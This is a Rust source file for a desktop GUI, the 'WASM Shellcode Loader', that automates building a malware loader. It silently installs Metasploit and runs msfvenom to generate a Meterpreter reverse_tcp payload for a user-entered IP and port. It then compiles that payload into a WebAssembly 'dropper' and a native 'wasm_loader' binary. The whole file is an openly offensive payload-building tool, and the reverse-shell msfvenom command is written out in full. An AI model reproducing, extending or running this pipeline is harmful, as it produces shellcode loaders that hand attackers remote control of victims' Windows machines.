use eframe::egui;
use egui::{Style, TextEdit, Widget};
use std::process::Command;
use std::path::Path;
use std::sync::Arc;

fn main() -> Result<(), eframe::Error> {
    env_logger::init();

    let options = eframe::NativeOptions {
        viewport: egui::ViewportBuilder::default().with_inner_size([550.0, 650.0]),
        ..Default::default()
    };

    eframe::run_native(
        "WASM Shellcode Loader GUI",
        options,
        Box::new(|_cc| Ok(Box::new(WasmLoaderApp::default()))),
    )
}

#[derive(Default)]
struct WasmLoaderApp {
    ip_address: String,
    port: String,
    generated_command: String,
    status: String,
    tools_status: ToolsStatus,
    first_run: bool,
}

#[derive(Default)]
struct ToolsStatus {
    wasm_pack_installed: Option<bool>,
    wabt_installed: Option<bool>,
    msfvenom_available: Option<bool>,
    cargo_available: Option<bool>,
    metasploit_framework_installed: Option<bool>,
}

// impl Default for WasmLoaderApp {
//     fn default() -> Self {
//         Self { ip_address: Ip, port: Default::default(), generated_command: Default::default(), status: Default::default(), tools_status: Default::default(), first_run: Default::default() }
//     }
// }

impl eframe::App for WasmLoaderApp {
    fn update(&mut self, ctx: &egui::Context, _frame: &mut eframe::Frame) {
        if !self.first_run {
            self.first_run = true;
            match serde_json::from_str::<Style>(STYLE) {
                Ok(theme) => {
                    let style = Arc::new(theme);
                    ctx.set_style(style);
                }
                Err(e) => println!("Error setting theme: {e:?}")
            };
        }

        egui::CentralPanel::default().show(ctx, |ui| {
            ui.heading("WASM Shellcode Loader Automation");
            ui.separator();

            // Tools Status Section
            ui.heading("Tools Status");
            if ui.button("Check Tools").clicked() {
                self.check_tools_status();
            }

            ui.horizontal(|ui| {
                ui.label("wasm-pack:");
                match self.tools_status.wasm_pack_installed {
                    Some(true) => ui.colored_label(egui::Color32::GREEN, "✓ Installed"),
                    Some(false) => ui.colored_label(egui::Color32::RED, "✗ Not installed"),
                    None => ui.label("Unknown"),
                };
            });

            ui.horizontal(|ui| {
                ui.label("wabt (wasm2wat):");
                match self.tools_status.wabt_installed {
                    Some(true) => ui.colored_label(egui::Color32::GREEN, "✓ Installed"),
                    Some(false) => ui.colored_label(egui::Color32::RED, "✗ Not installed"),
                    None => ui.label("Unknown"),
                };
            });

            ui.horizontal(|ui| {
                ui.label("msfvenom:");
                match self.tools_status.msfvenom_available {
                    Some(true) => ui.colored_label(egui::Color32::GREEN, "✓ Available"),
                    Some(false) => ui.colored_label(egui::Color32::RED, "✗ Not available"),
                    None => ui.label("Unknown"),
                };
            });

            ui.horizontal(|ui| {
                ui.label("cargo:");
                match self.tools_status.cargo_available {
                    Some(true) => ui.colored_label(egui::Color32::GREEN, "✓ Available"),
                    Some(false) => ui.colored_label(egui::Color32::RED, "✗ Not available"),
                    None => ui.label("Unknown"),
                };
            });

            if cfg!(target_os = "windows") {
                ui.horizontal(|ui| {
                    ui.label("Metasploit Framework:");
                    match self.tools_status.metasploit_framework_installed {
                        Some(true) => ui.colored_label(egui::Color32::GREEN, "✓ Installed"),
                        Some(false) => ui.colored_label(egui::Color32::RED, "✗ Not installed"),
                        None => ui.label("Unknown"),
                    };
                });
            }

            ui.separator();

            // Installation Section
            ui.heading("Install Missing Tools");
            
            if !self.tools_status.wasm_pack_installed.unwrap_or(true) {
                if ui.button("Install wasm-pack").clicked() {
                    self.install_wasm_pack();
                }
            }

            if !self.tools_status.wabt_installed.unwrap_or(true) {
                if ui.button("Install wabt (wasm2wat)").clicked() {
                    self.install_wabt();
                }
            }

            if cfg!(target_os = "windows") && !self.tools_status.metasploit_framework_installed.unwrap_or(true) {
                if ui.button("Download & Install Metasploit Framework").clicked() {
                    self.install_metasploit_framework();
                }
            }

            ui.separator();

            // Configuration Section
            ui.heading("Payload Configuration");
            
            ui.horizontal(|ui| {
                ui.label("IP Address:");
                ui.text_edit_singleline(&mut self.ip_address);
            });

            ui.horizontal(|ui| {
                ui.label("Port:");
                ui.text_edit_singleline(&mut self.port);
            });

            ui.separator();

            // Command Generation Section
            ui.heading("Command Generation");
            
            if ui.button("Generate msfvenom Command").clicked() {
                self.generate_msfvenom_command();
            }

            if self.tools_status.msfvenom_available.unwrap_or(false) && !self.ip_address.is_empty() && !self.port.is_empty() {
                if ui.button("Run msfvenom (Generate Payload)").clicked() {
                    self.run_msfvenom();
                }
            }

            if !self.generated_command.is_empty() {
                ui.label("Generated Command:");
                TextEdit::singleline(&mut self.generated_command).desired_width(400.).ui(ui);
                
                if ui.button("Copy to Clipboard").clicked() {
                    ctx.copy_text(self.generated_command.clone());
                    self.status = "Command copied to clipboard!".to_string();
                }
            }

            ui.separator();

            // Build Section
            ui.heading("Build Pipeline");
            
            if ui.button("Run Full Build Pipeline").clicked() {
                self.run_full_pipeline();
            }

            if ui.button("Build WASM Dropper").clicked() {
                self.build_wasm_dropper();
            }

            if ui.button("Convert WASM to WAT").clicked() {
                self.convert_wasm_to_wat();
            }

            if ui.button("Build WASM Loader").clicked() {
                self.build_wasm_loader();
            }

            ui.separator();

            // Status Section
            if !self.status.is_empty() {
                ui.heading("Status");
                ui.label(&self.status);
            }
        });
    }
}

impl WasmLoaderApp {
    fn check_tools_status(&mut self) {
        self.tools_status.wasm_pack_installed = Some(self.check_command_exists("wasm-pack"));
        self.tools_status.cargo_available = Some(self.check_command_exists("cargo"));
        
        // Check msfvenom availability - on Windows, check explicit path
        if cfg!(target_os = "windows") {
            let msfvenom_path = Path::new("C:\\metasploit-framework\\bin\\msfvenom.bat");
            self.tools_status.msfvenom_available = Some(msfvenom_path.exists());
            // Also check if Metasploit Framework is installed by checking the same path
            self.tools_status.metasploit_framework_installed = Some(msfvenom_path.exists());
        } else {
            self.tools_status.msfvenom_available = Some(self.check_command_exists("msfvenom"));
        }
        
        // Check if wabt is installed by looking for wasm2wat in the wabt directory or PATH
        let wabt_local = Path::new("./wabt/bin/wasm2wat").exists() || 
                        Path::new("./wabt/bin/wasm2wat.exe").exists();
        let wabt_system = self.check_command_exists("wasm2wat");
        self.tools_status.wabt_installed = Some(wabt_local || wabt_system);
        
        self.status = "Tools status checked".to_string();
    }

    fn check_command_exists(&self, command: &str) -> bool {
        Command::new("which")
            .arg(command)
            .output()
            .map(|output| output.status.success())
            .unwrap_or_else(|_| {
                // Fallback for Windows
                Command::new("where")
                    .arg(command)
                    .output()
                    .map(|output| output.status.success())
                    .unwrap_or(false)
            })
    }

    fn install_wasm_pack(&mut self) {
        self.status = "Installing wasm-pack...".to_string();
        
        match Command::new("cargo")
            .args(&["install", "wasm-pack"])
            .output()
        {
            Ok(output) => {
                if output.status.success() {
                    self.status = "wasm-pack installed successfully!".to_string();
                    self.tools_status.wasm_pack_installed = Some(true);
                } else {
                    self.status = format!("Failed to install wasm-pack: {}", 
                        String::from_utf8_lossy(&output.stderr));
                }
            }
            Err(e) => {
                self.status = format!("Error installing wasm-pack: {}", e);
            }
        }
    }

    fn install_wabt(&mut self) {
        self.status = "Installing wabt...".to_string();
        
        // Determine the appropriate download URL based on the platform
        let (url, filename) = if cfg!(target_os = "windows") {
            ("https://github.com/WebAssembly/wabt/releases/latest/download/wabt-1.0.37-windows.tar.gz", 
             "wabt.tar.gz")
        } else {
            ("https://github.com/WebAssembly/wabt/releases/latest/download/wabt-1.0.37-ubuntu-20.04.tar.gz", 
             "wabt.tar.gz")
        };

        // Download and extract wabt
        let download_result = Command::new("curl")
            .args(&["-L", "-o", filename, url])
            .output();

        match download_result {
            Ok(output) if output.status.success() => {
                // Extract the archive
                let _extract_result = Command::new("tar")
                    .args(&["-xzf", filename, "-C", ".", "--strip-components", "1"])
                    .current_dir("wabt")
                    .output();

                // Create wabt directory first if it doesn't exist
                let _ = std::fs::create_dir_all("wabt");
                
                let extract_result = Command::new("tar")
                    .args(&["-xzf", filename, "-C", "wabt", "--strip-components", "1"])
                    .output();

                match extract_result {
                    Ok(output) if output.status.success() => {
                        self.status = "wabt installed successfully!".to_string();
                        self.tools_status.wabt_installed = Some(true);
                        // Clean up downloaded file
                        let _ = std::fs::remove_file(filename);
                    }
                    Ok(output) => {
                        self.status = format!("Failed to extract wabt: {}", 
                            String::from_utf8_lossy(&output.stderr));
                    }
                    Err(e) => {
                        self.status = format!("Error extracting wabt: {}", e);
                    }
                }
            }
            Ok(output) => {
                self.status = format!("Failed to download wabt: {}", 
                    String::from_utf8_lossy(&output.stderr));
            }
            Err(e) => {
                self.status = format!("Error downloading wabt: {}", e);
            }
        }
    }

    fn install_metasploit_framework(&mut self) {
        if !cfg!(target_os = "windows") {
            self.status = "Metasploit Framework installer is only available for Windows".to_string();
            return;
        }

        self.status = "Downloading Metasploit Framework installer...".to_string();
        
        let url = "https://windows.metasploit.com/metasploitframework-latest.msi";
        let filename = "metasploitframework-latest.msi";

        // Download the MSI installer
        let download_result = Command::new("curl")
            .args(&["-L", "-o", filename, url])
            .output();

        match download_result {
            Ok(output) if output.status.success() => {
                self.status = "Metasploit Framework downloaded. Opening installer...".to_string();
                
                // Launch the MSI installer
                let install_result = Command::new("msiexec")
                    .args(&["/i", filename, "/passive", "/quiet"])
                    .output();

                match install_result {
                    Ok(output) if output.status.success() => {
                        self.status = "Metasploit Framework installer launched. Please follow the installation wizard.".to_string();
                        // Note: We don't immediately update the status as the installer runs separately
                    }
                    Ok(output) => {
                        self.status = format!("Failed to launch installer: {}", 
                            String::from_utf8_lossy(&output.stderr));
                    }
                    Err(e) => {
                        self.status = format!("Error launching installer: {}", e);
                    }
                }

                // Clean up downloaded file after attempting to launch installer
                let _ = std::fs::remove_file(filename);
            }
            Ok(output) => {
                self.status = format!("Failed to download Metasploit Framework: {}", 
                    String::from_utf8_lossy(&output.stderr));
            }
            Err(e) => {
                self.status = format!("Error downloading Metasploit Framework: {}", e);
            }
        }
    }

    fn generate_msfvenom_command(&mut self) {
        if self.ip_address.is_empty() || self.port.is_empty() {
            self.status = "Please enter both IP address and port".to_string();
            return;
        }

        self.generated_command = format!(
            "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={} LPORT={} -f rust",
            self.ip_address, self.port
        );
        
        self.status = "msfvenom command generated!".to_string();
    }

    fn run_full_pipeline(&mut self) {
        self.status = "Running full build pipeline...".to_string();
        
        // Check if we have the necessary tools
        if !self.tools_status.wasm_pack_installed.unwrap_or(false) {
            self.status = "Error: wasm-pack not installed. Please install it first.".to_string();
            return;
        }

        if !self.tools_status.wabt_installed.unwrap_or(false) {
            self.status = "Error: wabt not installed. Please install it first.".to_string();
            return;
        }

        if !self.tools_status.msfvenom_available.unwrap_or(false) {
            self.status = "Error: msfvenom not available. Please install Metasploit Framework first.".to_string();
            return;
        }

        if self.ip_address.is_empty() || self.port.is_empty() {
            self.status = "Error: Please enter IP address and port for msfvenom payload generation.".to_string();
            return;
        }

        // Step 1: Generate payload with msfvenom and place it in wasm_dropper
        if !self.run_msfvenom() {
            return; // Error already set in run_msfvenom
        }
        
        // Step 2: Build wasm_dropper
        self.build_wasm_dropper();
        
        // Step 3: Convert to WAT
        self.convert_wasm_to_wat();
        
        // Step 4: Build wasm_loader
        self.build_wasm_loader();
    }

    fn run_msfvenom(&mut self) -> bool {
        self.status = "Generating payload with msfvenom...".to_string();
        
        // Determine msfvenom executable path
        let msfvenom_cmd = if cfg!(target_os = "windows") {
            "C:\\metasploit-framework\\bin\\msfvenom.bat"
        } else {
            "msfvenom"
        };

        // Generate the payload and output to wasm_dropper directory
        let output_file = "./wasm_dropper/src/payload.rs";
        
        match Command::new(msfvenom_cmd)
            .args(&[
                "-p", "windows/x64/meterpreter/reverse_tcp",
                &format!("LHOST={}", self.ip_address),
                &format!("LPORT={}", self.port),
                "-f", "rust",
                "-o", output_file
            ])
            .output()
        {
            Ok(output) => {
                if output.status.success() {
                    self.status = "Payload generated successfully with msfvenom!".to_string();
                    true
                } else {
                    self.status = format!("Failed to generate payload: {}", 
                        String::from_utf8_lossy(&output.stderr));
                    false
                }
            }
            Err(e) => {
                self.status = format!("Error running msfvenom: {}", e);
                false
            }
        }
    }

    fn build_wasm_dropper(&mut self) {
        self.status = "Building wasm_dropper...".to_string();
        
        match Command::new("wasm-pack")
            .args(&["build", "--release"])
            .current_dir("wasm_dropper")
            .output()
        {
            Ok(output) => {
                if output.status.success() {
                    self.status = "wasm_dropper built successfully!".to_string();
                } else {
                    self.status = format!("Failed to build wasm_dropper: {}", 
                        String::from_utf8_lossy(&output.stderr));
                }
            }
            Err(e) => {
                self.status = format!("Error building wasm_dropper: {}", e);
            }
        }
    }

    fn convert_wasm_to_wat(&mut self) {
        self.status = "Converting WASM to WAT...".to_string();
        
        // Determine the wasm2wat executable path
        let wasm2wat_exe = if Path::new("./wabt/bin/wasm2wat.exe").exists() {
            "./wabt/bin/wasm2wat.exe"
        } else if Path::new("./wabt/bin/wasm2wat").exists() {
            "./wabt/bin/wasm2wat"
        } else {
            "wasm2wat" // Assume it's in PATH
        };

        // Ensure the target directory exists
        let target_dir = Path::new("./target/wasm32-unknown-unknown/release");
        if !target_dir.exists() {
            self.status = "Error: WASM binary not found. Please build wasm_dropper first.".to_string();
            return;
        }

        let wasm_file = "./target/wasm32-unknown-unknown/release/wasm_dropper.wasm";
        let wat_file = "./wasm_loader/src/wasm_dropper.wat";

        match Command::new(wasm2wat_exe)
            .args(&[wasm_file, "-o", wat_file])
            .output()
        {
            Ok(output) => {
                if output.status.success() {
                    self.status = "WASM converted to WAT successfully!".to_string();
                } else {
                    self.status = format!("Failed to convert WASM to WAT: {}", 
                        String::from_utf8_lossy(&output.stderr));
                }
            }
            Err(e) => {
                self.status = format!("Error converting WASM to WAT: {}", e);
            }
        }
    }

    fn build_wasm_loader(&mut self) {
        self.status = "Building wasm_loader...".to_string();
        
        match Command::new("cargo")
            .args(&["build", "--release"])
            .current_dir("wasm_loader")
            .output()
        {
            Ok(output) => {
                if output.status.success() {
                    self.status = "wasm_loader built successfully! Binary is at ./target/release/wasm_loader".to_string();
                } else {
                    self.status = format!("Failed to build wasm_loader: {}", 
                        String::from_utf8_lossy(&output.stderr));
                }
            }
            Err(e) => {
                self.status = format!("Error building wasm_loader: {}", e);
            }
        }
    }
}

const STYLE: &str = r#"{"override_text_style":null,"override_font_id":null,"override_text_valign":"Center","text_styles":{"Small":{"size":10.0,"family":"Proportional"},"Body":{"size":14.0,"family":"Proportional"},"Monospace":{"size":12.0,"family":"Monospace"},"Button":{"size":14.0,"family":"Proportional"},"Heading":{"size":18.0,"family":"Proportional"}},"drag_value_text_style":"Button","wrap":null,"wrap_mode":null,"spacing":{"item_spacing":{"x":3.0,"y":3.0},"window_margin":{"left":12,"right":12,"top":12,"bottom":12},"button_padding":{"x":5.0,"y":3.0},"menu_margin":{"left":12,"right":12,"top":12,"bottom":12},"indent":18.0,"interact_size":{"x":40.0,"y":20.0},"slider_width":100.0,"slider_rail_height":8.0,"combo_width":100.0,"text_edit_width":280.0,"icon_width":14.0,"icon_width_inner":8.0,"icon_spacing":6.0,"default_area_size":{"x":600.0,"y":400.0},"tooltip_width":600.0,"menu_width":400.0,"menu_spacing":2.0,"indent_ends_with_horizontal_line":false,"combo_height":200.0,"scroll":{"floating":true,"bar_width":6.0,"handle_min_length":12.0,"bar_inner_margin":4.0,"bar_outer_margin":0.0,"floating_width":2.0,"floating_allocated_width":0.0,"foreground_color":true,"dormant_background_opacity":0.0,"active_background_opacity":0.4,"interact_background_opacity":0.7,"dormant_handle_opacity":0.0,"active_handle_opacity":0.6,"interact_handle_opacity":1.0}},"interaction":{"interact_radius":5.0,"resize_grab_radius_side":5.0,"resize_grab_radius_corner":10.0,"show_tooltips_only_when_still":true,"tooltip_delay":0.5,"tooltip_grace_time":0.2,"selectable_labels":true,"multi_widget_text_select":true},"visuals":{"dark_mode":true,"text_alpha_from_coverage":"TwoCoverageMinusCoverageSq","override_text_color":[207,216,220,255],"weak_text_alpha":0.6,"weak_text_color":null,"widgets":{"noninteractive":{"bg_fill":[0,0,0,0],"weak_bg_fill":[61,61,61,232],"bg_stroke":{"width":1.0,"color":[71,71,71,247]},"corner_radius":{"nw":6,"ne":6,"sw":6,"se":6},"fg_stroke":{"width":1.0,"color":[207,216,220,255]},"expansion":0.0},"inactive":{"bg_fill":[58,51,106,0],"weak_bg_fill":[8,8,8,231],"bg_stroke":{"width":1.5,"color":[48,51,73,255]},"corner_radius":{"nw":6,"ne":6,"sw":6,"se":6},"fg_stroke":{"width":1.0,"color":[207,216,220,255]},"expansion":0.0},"hovered":{"bg_fill":[37,29,61,97],"weak_bg_fill":[95,62,97,69],"bg_stroke":{"width":1.7,"color":[106,101,155,255]},"corner_radius":{"nw":6,"ne":6,"sw":6,"se":6},"fg_stroke":{"width":1.5,"color":[83,87,88,35]},"expansion":2.0},"active":{"bg_fill":[12,12,15,255],"weak_bg_fill":[39,37,54,214],"bg_stroke":{"width":1.0,"color":[12,12,16,255]},"corner_radius":{"nw":6,"ne":6,"sw":6,"se":6},"fg_stroke":{"width":2.0,"color":[207,216,220,255]},"expansion":1.0},"open":{"bg_fill":[20,22,28,255],"weak_bg_fill":[17,18,22,255],"bg_stroke":{"width":1.8,"color":[42,44,93,165]},"corner_radius":{"nw":6,"ne":6,"sw":6,"se":6},"fg_stroke":{"width":1.0,"color":[109,109,109,255]},"expansion":0.0}},"selection":{"bg_fill":[23,64,53,27],"stroke":{"width":1.0,"color":[12,12,15,255]}},"hyperlink_color":[135,85,129,255],"faint_bg_color":[17,18,22,255],"extreme_bg_color":[9,12,15,83],"text_edit_bg_color":null,"code_bg_color":[30,31,35,255],"warn_fg_color":[61,185,157,255],"error_fg_color":[255,55,102,255],"window_corner_radius":{"nw":6,"ne":6,"sw":6,"se":6},"window_shadow":{"offset":[0,0],"blur":7,"spread":5,"color":[17,17,41,118]},"window_fill":[11,11,15,255],"window_stroke":{"width":1.0,"color":[77,94,120,138]},"window_highlight_topmost":true,"menu_corner_radius":{"nw":6,"ne":6,"sw":6,"se":6},"panel_fill":[12,12,15,255],"popup_shadow":{"offset":[0,0],"blur":8,"spread":3,"color":[19,18,18,96]},"resize_corner_size":18.0,"text_cursor":{"stroke":{"width":2.0,"color":[197,192,255,255]},"preview":true,"blink":true,"on_duration":0.5,"off_duration":0.5},"clip_rect_margin":3.0,"button_frame":true,"collapsing_header_frame":true,"indent_has_left_vline":true,"striped":true,"slider_trailing_fill":true,"handle_shape":{"Rect":{"aspect_ratio":0.5}},"interact_cursor":"Crosshair","image_loading_spinners":true,"numeric_color_space":"GammaByte","disabled_alpha":0.5},"animation_time":0.083333336,"debug":{"debug_on_hover":false,"debug_on_hover_with_all_modifiers":false,"hover_shows_next":false,"show_expand_width":false,"show_expand_height":false,"show_resize":false,"show_interactive_widgets":false,"show_widget_hits":false,"show_unaligned":true},"explanation_tooltips":false,"url_in_tooltip":false,"always_scroll_the_only_direction":true,"scroll_animation":{"points_per_second":1000.0,"duration":{"min":0.1,"max":0.3}},"compact_menu_style":true}"#;